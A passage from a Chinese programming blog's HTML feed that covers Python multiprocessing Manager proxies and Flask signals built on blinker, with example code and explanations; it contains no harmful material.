punctuation">)</span>SyncManager<span class="token punctuation">.</span>register<span class="token punctuation">(</span><span class="token string">'Barrier'</span><span class="token punctuation">,</span> threading<span class="token punctuation">.</span>Barrier<span class="token punctuation">,</span> BarrierProxy<span class="token punctuation">)</span>SyncManager<span class="token punctuation">.</span>register<span class="token punctuation">(</span><span class="token string">'Pool'</span><span class="token punctuation">,</span> pool<span class="token punctuation">.</span>Pool<span class="token punctuation">,</span> PoolProxy<span class="token punctuation">)</span>SyncManager<span class="token punctuation">.</span>register<span class="token punctuation">(</span><span class="token string">'list'</span><span class="token punctuation">,</span> list<span class="token punctuation">,</span> ListProxy<span class="token punctuation">)</span>SyncManager<span class="token punctuation">.</span>register<span class="token punctuation">(</span><span class="token string">'dict'</span><span class="token punctuation">,</span> dict<span class="token punctuation">,</span> DictProxy<span class="token punctuation">)</span>SyncManager<span class="token punctuation">.</span>register<span class="token punctuation">(</span><span class="token string">'Value'</span><span class="token punctuation">,</span> Value<span class="token punctuation">,</span> ValueProxy<span class="token punctuation">)</span>SyncManager<span class="token punctuation">.</span>register<span class="token punctuation">(</span><span class="token string">'Array'</span><span class="token punctuation">,</span> Array<span class="token punctuation">,</span> ArrayProxy<span class="token punctuation">)</span>SyncManager<span class="token punctuation">.</span>register<span class="token punctuation">(</span><span class="token string">'Namespace'</span><span class="token punctuation">,</span> Namespace<span class="token punctuation">,</span> NamespaceProxy<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># types returned by methods of PoolProxy</span>SyncManager<span class="token punctuation">.</span>register<span class="token punctuation">(</span><span class="token string">'Iterator'</span><span class="token punctuation">,</span> proxytype<span class="token operator">=</span>IteratorProxy<span class="token punctuation">,</span> create_method<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>SyncManager<span class="token punctuation">.</span>register<span class="token punctuation">(</span><span class="token string">'AsyncResult'</span><span class="token punctuation">,</span> create_method<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>进程的类的方法都是这个类的方法,都通过注册的方式注册到这里,而且它是继承自<code>BaseManager</code>,这意味着我们可以自己写类并注册到<code>BaseManager</code> 中</p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python</span><span class="token comment" spellcheck="true"># coding=utf-8</span><span class="token keyword">from</span> multiprocessing<span class="token punctuation">.</span>managers <span class="token keyword">import</span> BaseManager<span class="token keyword">class</span> <span class="token class-name">MathsClass</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> x<span class="token punctuation">,</span> y<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> x <span class="token operator">+</span> y    <span class="token keyword">def</span> <span class="token function">mul</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> x<span class="token punctuation">,</span> y<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> x <span class="token operator">*</span> y<span class="token keyword">class</span> <span class="token class-name">MyManager</span><span class="token punctuation">(</span>BaseManager<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">pass</span><span class="token comment" spellcheck="true"># 可以用于向管理器类注册类型或可调用的类方法</span>MyManager<span class="token punctuation">.</span>register<span class="token punctuation">(</span><span class="token string">'Maths'</span><span class="token punctuation">,</span> MathsClass<span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true"># 实例化进程类</span>    manager <span class="token operator">=</span> MyManager<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># 为此管理器对象生成一个服务器进程</span>    manager<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># 调用注册的方法</span>    maths <span class="token operator">=</span> manager<span class="token punctuation">.</span>Maths<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>maths<span class="token punctuation">.</span>add<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>maths<span class="token punctuation">.</span>mul<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>下面看个简单的例子</p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#coding=utf-8</span><span class="token keyword">import</span> multiprocessing<span class="token keyword">def</span> <span class="token function">fun</span><span class="token punctuation">(</span>ns<span class="token punctuation">)</span><span class="token punctuation">:</span>    ns<span class="token punctuation">.</span>x<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    ns<span class="token punctuation">.</span>y<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token string">'x'</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    manager <span class="token operator">=</span> multiprocessing<span class="token punctuation">.</span>Manager<span class="token punctuation">(</span><span class="token punctuation">)</span>    ns <span class="token operator">=</span> manager<span class="token punctuation">.</span>Namespace<span class="token punctuation">(</span><span class="token punctuation">)</span>    ns<span class="token punctuation">.</span>x <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    ns<span class="token punctuation">.</span>y <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">print</span> <span class="token string">"before"</span><span class="token punctuation">,</span>ns    p <span class="token operator">=</span> multiprocessing<span class="token punctuation">.</span>Process<span class="token punctuation">(</span>target<span class="token operator">=</span>fun<span class="token punctuation">,</span>args<span class="token operator">=</span><span class="token punctuation">(</span>ns<span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">print</span> <span class="token string">"after"</span><span class="token punctuation">,</span>ns<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>本程序的目的是想得到x=[1],y=[‘x’],但是没有得到，这是为什么呢？这是因为manager对象仅能传播一个可变对象本身所做的修改，如果一个manager.list()对象，管理列表本身的任何更改会传播到所有其他进程，但是如果容器对象内部还包括可修改对象，则内部可修改对象的任何更改都不会传播到其他进程。上面例子中，ns是一个容器，它本身的改变会传播到所有进程，但是它的内部对象x,y是可变对象，它们的改变不会传播到其他进程，所有没有得到我们所要的结果。可以作如下修改：</p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#coding=utf-8</span><span class="token keyword">import</span> multiprocessing<span class="token keyword">def</span> <span class="token function">fun</span><span class="token punctuation">(</span>ns<span class="token punctuation">,</span>x<span class="token punctuation">,</span>y<span class="token punctuation">)</span><span class="token punctuation">:</span>    x<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    y<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token string">'x'</span><span class="token punctuation">)</span>    ns<span class="token punctuation">.</span>x <span class="token operator">=</span> x    ns<span class="token punctuation">.</span>y <span class="token operator">=</span> y<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    manager <span class="token operator">=</span> multiprocessing<span class="token punctuation">.</span>Manager<span class="token punctuation">(</span><span class="token punctuation">)</span>    ns <span class="token operator">=</span> manager<span class="token punctuation">.</span>Namespace<span class="token punctuation">(</span><span class="token punctuation">)</span>    ns<span class="token punctuation">.</span>x <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    ns<span class="token punctuation">.</span>y <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">print</span> <span class="token string">"before"</span><span class="token punctuation">,</span>ns    p <span class="token operator">=</span> multiprocessing<span class="token punctuation">.</span>Process<span class="token punctuation">(</span>target<span class="token operator">=</span>fun<span class="token punctuation">,</span>args<span class="token operator">=</span><span class="token punctuation">(</span>ns<span class="token punctuation">,</span>ns<span class="token punctuation">.</span>x<span class="token punctuation">,</span>ns<span class="token punctuation">.</span>y<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">print</span> <span class="token string">"after"</span><span class="token punctuation">,</span>ns<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/wechat.png" alt="wechat"></p><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Flask信号</title>
      <link href="/posts/57252.html"/>
      <url>/posts/57252.html</url>
      
        <content type="html"><![CDATA[<p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/2020-10-29/1603974337105-10327.png" alt="10327"></p><h2 id="Flask信号机制"><a href="#Flask信号机制" class="headerlink" title="Flask信号机制"></a>Flask信号机制</h2><h3 id="1-什么是Flask信号"><a href="#1-什么是Flask信号" class="headerlink" title="1.什么是Flask信号"></a>1.什么是<code>Flask</code>信号</h3><blockquote><p><code>Flask</code> 从<code>0.6</code> 版本开始,信号功能有插件<code>blinker</code> 来提供,这个插件必须安装才能开启信号功能,它的安装很简单,如下:</p><pre class="line-numbers language-bash">$ pip install blinker</code></pre><p>那什么是信号呢?它指的是当核心框架或另一个<code>Flask</code> 扩展中发生动作时,信号通过发送通知来帮助解耦应用,也就是信号允许某个发送者通知接受者有事情发生.按照官网的说法,信号的使用目的是通知接受者,不鼓励接受者去修改数据,它的更多应用是在记录发生的这些事情,比如记录日志文件等等.</p><p>在<code>Flask</code> 中所有与信号相关的函数定义在<code>flask/signals.py</code> 文件中.</p><p><a href="https://pythonhosted.org/blinker/index.html#blinker" target="_blank" rel="noopener">参考</a></p></blockquote><h3 id="2-blinker"><a href="#2-blinker" class="headerlink" title="2.blinker"></a>2.<code>blinker</code></h3><blockquote><p><code>blinker</code> 是一个基于<code>Python</code> 的信号库.支持一对一,一对多的订阅发布模式,支持发送任意大小数据,并且线程安全.</p><p>根据<code>blinker</code> 可以自定义一个信号,它基本包括以下步骤:</p><ul><li>创建信号</li><li>订阅信号</li><li>触发信号</li></ul><p>首先介绍几个相关的类:</p><pre><code class="python"><code class="language-bash">$ pip install blinker</code></pre><p>那什么是信号呢?它指的是当核心框架或另一个<code>Flask</code> 扩展中发生动作时,信号通过发送通知来帮助解耦应用,也就是信号允许某个发送者通知接受者有事情发生.按照官网的说法,信号的使用目的是通知接受者,不鼓励接受者去修改数据,它的更多应用是在记录发生的这些事情,比如记录日志文件等等.</p><p>在<code>Flask</code> 中所有与信号相关的函数定义在<code>flask/signals.py</code> 文件中.</p><p><a href="https://pythonhosted.org/blinker/index.html#blinker" target="_blank" rel="noopener">参考</a></p></blockquote><h3 id="2-blinker"><a href="#2-blinker" class="headerlink" title="2.blinker"></a>2.<code>blinker</code></h3><blockquote><p><code>blinker</code> 是一个基于<code>Python</code> 的信号库.支持一对一,一对多的订阅发布模式,支持发送任意大小数据,并且线程安全.</p><p>根据<code>blinker</code> 可以自定义一个信号,它基本包括以下步骤:</p><ul><li>创建信号</li><li>订阅信号</li><li>触发信号</li></ul><p>首先介绍几个相关的类:</p><pre><code class="python">>>> import blinker>>> help(blinker.Namespace)    A mapping of signal names to signals. 信号名称和信号的映射,命名空间,为了防止多人编写时,变量名称重复的问题 class Namespace(dict):    def signal(self, name, doc=None):        try:            return self[name]        except KeyError:            return self.setdefault(name, NamedSignal(name, doc))<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>它的创建类似于:</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> blinker <span class="token keyword">import</span> Namespace<span class="token comment" spellcheck="true"># 1.生成一个Namespace命名空间,这是为了防止多人编写时定义了相同的变量名称</span>myspace <span class="token operator">=</span> Namespace<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># signal中指定信号的名称</span>test_signle_1<span class="token operator">=</span>myspace<span class="token punctuation">.</span>signal<span class="token punctuation">(</span><span class="token string">'test_signle_1'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>接下来需要指定订阅信号,需要使用<code>connect()</code> 方法来指定订阅信号的函数,已经要执行的操作</p><pre class="line-numbers language-python"><code class="language-python"> <span class="token operator">>></span><span class="token operator">></span> help<span class="token punctuation">(</span>blinker<span class="token punctuation">.</span>Namespace<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>signal<span class="token punctuation">(</span><span class="token string">'test'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>connect<span class="token punctuation">)</span>connect<span class="token punctuation">(</span>receiver<span class="token punctuation">,</span> sender<span class="token operator">=</span>ANY<span class="token punctuation">,</span> weak<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>     receiver<span class="token punctuation">:</span>指定一个可调用的函数<span class="token punctuation">,</span>必须写<span class="token punctuation">,</span>这个函数第一个参数必须是sender<span class="token punctuation">,</span>用来指定订阅者<span class="token punctuation">,</span>后面可以接任意的参数<span class="token punctuation">,</span>这些参数由 send<span class="token punctuation">(</span><span class="token punctuation">)</span>方法发送     sender<span class="token punctuation">:</span>指定订阅者<span class="token punctuation">,</span>可以不写    Connect <span class="token operator">*</span>receiver<span class="token operator">*</span> to signal events sent by <span class="token operator">*</span>sender<span class="token operator">*</span><span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>它的使用类似与:</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> blinker <span class="token keyword">import</span> Namespace<span class="token comment" spellcheck="true"># 1.生成一个Namespace命名空间,这是为了防止多人编写时定义了相同的变量名称</span>myspace <span class="token operator">=</span> Namespace<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># signal中指定信号的名称</span>test_signle_1<span class="token operator">=</span>myspace<span class="token punctuation">.</span>signal<span class="token punctuation">(</span><span class="token string">'test_signle_1'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 2.订阅一个信号</span><span class="token keyword">def</span> <span class="token function">got_sender</span><span class="token punctuation">(</span>sender<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'sender %r'</span> <span class="token operator">%</span> sender<span class="token punctuation">)</span>test_signle_1<span class="token punctuation">.</span>connect<span class="token punctuation">(</span>got_sender<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>最后触发信号,可以传递一些参数给自定义的<code>receiver</code> 方法</p><pre class="line-numbers language-python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> help<span class="token punctuation">(</span>blinker<span class="token punctuation">.</span>Namespace<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>signal<span class="token punctuation">(</span><span class="token string">'test'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>send<span class="token punctuation">)</span>send<span class="token punctuation">(</span><span class="token operator">*</span>sender<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span>    Emit this signal on behalf of <span class="token operator">*</span>sender<span class="token operator">*</span><span class="token punctuation">,</span> passing on \<span class="token operator">*</span>\<span class="token operator">*</span>kwargs<span class="token punctuation">.</span>    Returns a list of <span class="token number">2</span><span class="token operator">-</span>tuples<span class="token punctuation">,</span> pairing receivers <span class="token keyword">with</span> their <span class="token keyword">return</span>    value<span class="token punctuation">.</span> The ordering of receiver notification <span class="token keyword">is</span> undefined<span class="token punctuation">.</span>    <span class="token punctuation">:</span>param \<span class="token operator">*</span>sender<span class="token punctuation">:</span> Any object <span class="token operator">or</span> ``None``<span class="token punctuation">.</span>  If omitted<span class="token punctuation">,</span> synonymous      <span class="token keyword">with</span> ``None``<span class="token punctuation">.</span>  Only accepts one positional argument<span class="token punctuation">.</span>    <span class="token punctuation">:</span>param \<span class="token operator">*</span>\<span class="token operator">*</span>kwargs<span class="token punctuation">:</span> Data to be sent to receivers<span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>它的使用是:</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> blinker <span class="token keyword">import</span> Namespace<span class="token comment" spellcheck="true"># 1.生成一个Namespace命名空间,这是为了防止多人编写时定义了相同的变量名称</span>myspace <span class="token operator">=</span> Namespace<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># signal中指定信号的名称</span>test_signle_1<span class="token operator">=</span>myspace<span class="token punctuation">.</span>signal<span class="token punctuation">(</span><span class="token string">'test_signle_1'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 2.订阅一个信号</span><span class="token keyword">def</span> <span class="token function">got_sender</span><span class="token punctuation">(</span>sender<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'sender %r'</span> <span class="token operator">%</span> sender<span class="token punctuation">)</span>test_signle_1<span class="token punctuation">.</span>connect<span class="token punctuation">(</span>got_sender<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 3.触发信号</span>test_signle_1<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>以上是没有指定订阅者的,这里可以指定一个订阅者,并返回一些数据给自定义的函数</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> blinker <span class="token keyword">import</span> Namespace<span class="token comment" spellcheck="true"># 1.生成信号</span>my_space <span class="token operator">=</span> Namespace<span class="token punctuation">(</span><span class="token punctuation">)</span>test_signal_2<span class="token operator">=</span>my_space<span class="token punctuation">.</span>signal<span class="token punctuation">(</span><span class="token string">'test_signal_2'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 2.订阅信号</span><span class="token keyword">class</span> <span class="token class-name">order</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>name<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token keyword">def</span> <span class="token function">receiver</span><span class="token punctuation">(</span>sender<span class="token punctuation">,</span>name<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'sender:{},args:{}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>sender<span class="token punctuation">,</span>name<span class="token punctuation">)</span><span class="token punctuation">)</span>test_signal_2<span class="token punctuation">.</span>connect<span class="token punctuation">(</span>receiver<span class="token punctuation">,</span>order<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 3.触发信号</span>test_signal_2<span class="token punctuation">.</span>send<span class="token punctuation">(</span>order<span class="token punctuation">,</span>name<span class="token operator">=</span><span class="token string">'test'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>执行</p><pre class="line-numbers language-bash"><code class="language-bash">❯ python single_test2.pysender:<span class="token operator">&lt;</span>class <span class="token string">'__main__.order'</span><span class="token operator">></span>,args:test<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></blockquote><h3 id="3-Flask-内置信号与blinker-关联"><a href="#3-Flask-内置信号与blinker-关联" class="headerlink" title="3.Flask 内置信号与blinker 关联"></a>3.<code>Flask</code> 内置信号与<code>blinker</code> 关联</h3><blockquote><p>查看<code>flask/signals.py</code></p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> blinker <span class="token keyword">import</span> Namespace_signals <span class="token operator">=</span> Namespace<span class="token punctuation">(</span><span class="token punctuation">)</span>template_rendered <span class="token operator">=</span> _signals<span class="token punctuation">.</span>signal<span class="token punctuation">(</span><span class="token string">"template-rendered"</span><span class="token punctuation">)</span>before_render_template <span class="token operator">=</span> _signals<span class="token punctuation">.</span>signal<span class="token punctuation">(</span><span class="token string">"before-render-template"</span><span class="token punctuation">)</span>request_started <span class="token operator">=</span> _signals<span class="token punctuation">.</span>signal<span class="token punctuation">(</span><span class="token string">"request-started"</span><span class="token punctuation">)</span>request_finished <span class="token operator">=</span> _signals<span class="token punctuation">.</span>signal<span class="token punctuation">(</span><span class="token string">"request-finished"</span><span class="token punctuation">)</span>request_tearing_down <span class="token operator">=</span> _signals<span class="token punctuation">.</span>signal<span class="token punctuation">(</span><span class="token string">"request-tearing-down"</span><span class="token punctuation">)</span>got_request_exception <span class="token operator">=</span> _signals<span class="token punctuation">.</span>signal<span class="token punctuation">(</span><span class="token string">"got-request-exception"</span><span class="token punctuation">)</span>appcontext_tearing_down <span class="token operator">=</span> _signals<span class="token punctuation">.</span>signal<span class="token punctuation">(</span><span class="token string">"appcontext-tearing-down"</span><span class="token punctuation">)</span>appcontext_pushed <span class="token operator">=</span> _signals<span class="token punctuation">.</span>signal<span class="token punctuation">(</span><span class="token string">"appcontext-pushed"</span><span class="token punctuation">)</span>appcontext_popped <span class="token operator">=</span> _signals<span class="token punctuation">.</span>signal<span class="token punctuation">(</span><span class="token string">"appcontext-popped"</span><span class="token punctuation">)</span>message_flashed <span class="token operator">=</span> _signals<span class="token punctuation">.</span>signal<span class="token punctuation">(</span><span class="token string">"message-flashed"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>Flask</code> 中内置了以上的信号,他们的对应是</p><table><thead><tr><th>信号</th><th>使用</th></tr></thead><tbody><tr><td><code>template_rendered</code></td><td>成功渲染模板后使用此信号.</td></tr><tr><td><code>before_render_template</code></td><td>渲染模板之前发送信号</td></tr><tr><td><code>request_started</code></td><td>发送请求之前,发送信号</td></tr><tr><td><code>request_finished</code></td><td>响应发送到客户端之前发送信号</td></tr><tr><td><code>got_request_exception</code></td><td>请求处理期间发生异常发送此信号</td></tr><tr><td><code>request_tearing_down</code></td><td>请求上下文消除时发送信号,即是有异常</td></tr><tr><td><code>appcontext_pushed</code></td><td>推送应用程序上下文发送信号</td></tr><tr><td><code>appcontext_poped</code></td><td><code>pop</code> 应用上下文发送信号</td></tr><tr><td><code>message_flashed</code></td><td>应用程序闪烁消息时发送此信号</td></tr></tbody></table><p>可以看到<code>flask/signal.py</code> 中只是创建了信号,信号的订阅者,和触发者都定义在渲染模板相关函数中.</p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># flask/temlating.py</span><span class="token keyword">def</span> <span class="token function">render_template</span><span class="token punctuation">(</span>template_name_or_list<span class="token punctuation">,</span> <span class="token operator">**</span>context<span class="token punctuation">)</span><span class="token punctuation">:</span>  ctx <span class="token operator">=</span> _app_ctx_stack<span class="token punctuation">.</span>topctx<span class="token punctuation">.</span>app<span class="token punctuation">.</span>update_template_context<span class="token punctuation">(</span>context<span class="token punctuation">)</span><span class="token keyword">return</span> _render<span class="token punctuation">(</span>  ctx<span class="token punctuation">.</span>app<span class="token punctuation">.</span>jinja_env<span class="token punctuation">.</span>get_or_select_template<span class="token punctuation">(</span>template_name_or_list<span class="token punctuation">)</span><span class="token punctuation">,</span>  context<span class="token punctuation">,</span>  ctx<span class="token punctuation">.</span>app<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">_render</span><span class="token punctuation">(</span>template<span class="token punctuation">,</span> context<span class="token punctuation">,</span> app<span class="token punctuation">)</span><span class="token punctuation">:</span>before_render_template<span class="token punctuation">.</span>send<span class="token punctuation">(</span>app<span class="token punctuation">,</span> template<span class="token operator">=</span>template<span class="token punctuation">,</span> context<span class="token operator">=</span>context<span class="token punctuation">)</span>rv <span class="token operator">=</span> template<span class="token punctuation">.</span>render<span class="token punctuation">(</span>context<span class="token punctuation">)</span>template_rendered<span class="token punctuation">.</span>send<span class="token punctuation">(</span>app<span class="token punctuation">,</span> template<span class="token operator">=</span>template<span class="token punctuation">,</span> context<span class="token operator">=</span>context<span class="token punctuation">)</span><span class="token keyword">return</span> rv<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><h4 id="1-几个常用的信号"><a href="#1-几个常用的信号" class="headerlink" title="1.几个常用的信号"></a>1.几个常用的信号</h4><blockquote><ul><li><code>template_rendered</code>: 渲染模板后的信号</li></ul><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># app.py</span><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span>render_template<span class="token punctuation">,</span>template_renderedapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">template_rendered_func</span><span class="token punctuation">(</span>sender<span class="token punctuation">,</span>template<span class="token punctuation">,</span>context<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'sender:{}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>sender<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'context:{}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>context<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'template:{}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>template<span class="token punctuation">)</span><span class="token punctuation">)</span>template_rendered<span class="token punctuation">.</span>connect<span class="token punctuation">(</span>template_rendered_func<span class="token punctuation">,</span>app<span class="token punctuation">)</span>@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token triple-quoted-string string">"""sender:&lt;Flask 'app'>context:{'g': &lt;flask.g of 'app'>, 'request': &lt;Request 'http://127.0.0.1:5000/' [GET]>, 'session': &lt;NullSession {}>}template:&lt;Template 'index.html'>"""</span>    <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>从上面可以看到,手动实现了信号的订阅,因为信号的生成定义在了<code>flask/signals.py</code> 中,信号的触发定义在了<code>flask/templating.py</code> 文件中,这里只需要手动的使用信号的订阅者和触发的函数就可以了.</p><ul><li><code>got_request_exception</code> :在请求处理视图函数时,发生异常可以调用这个信号,它定义在<code>flask/app.py</code> 